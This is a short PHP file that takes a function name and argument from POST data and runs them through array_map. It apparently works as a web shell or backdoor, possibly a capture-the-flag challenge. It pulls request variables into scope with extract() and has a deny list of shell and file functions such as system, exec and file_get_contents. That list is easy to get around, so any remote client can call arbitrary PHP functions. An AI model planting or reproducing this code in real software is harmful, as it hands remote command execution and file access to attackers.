<?php
	extract($_POST);
	if(isset($_POST['nep'])) {
		$wh = ['system','shell_exec','passthru','exec','file_get_contents','readdir','glob','assert'];
		if(in_array(strtolower($nep), $wh)) {
			die('no');
		}
		echo json_encode(array_map($nep, [$ska]));
		die();
	}
?>